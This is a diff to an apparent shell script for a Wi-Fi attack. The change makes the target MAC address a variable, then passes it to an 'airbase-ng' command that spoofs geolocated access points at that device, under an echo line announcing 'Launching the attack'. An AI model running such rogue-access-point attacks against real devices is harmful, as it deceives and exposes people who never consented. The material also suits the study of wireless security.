@@ -15,7 +15,8 @@ precision=0.0005;
 torify="";
 # Enter your Google API key here
 api_key="";
-
+# Enter target MAC address here
+target_mac="";
 
 if [ "$#" -ne 2 ]
 then
@@ -63,4 +64,4 @@ php filter-track-geo.php $(echo $lat-$precision | bc) $(echo $long-$precision | 
 echo -e "\nLaunching the attack with aircrack-ng and the list of AP."
 echo "We need to be root for this"
 #sudo mdk3 "$interface" b -v $tmpfile -g -t
-sudo airbase-ng -m $tmpfile -p -X -d 78:d6:f0:33:ac:ca wlan0
+sudo airbase-ng -m $tmpfile -p -X -d $target_mac wlan0
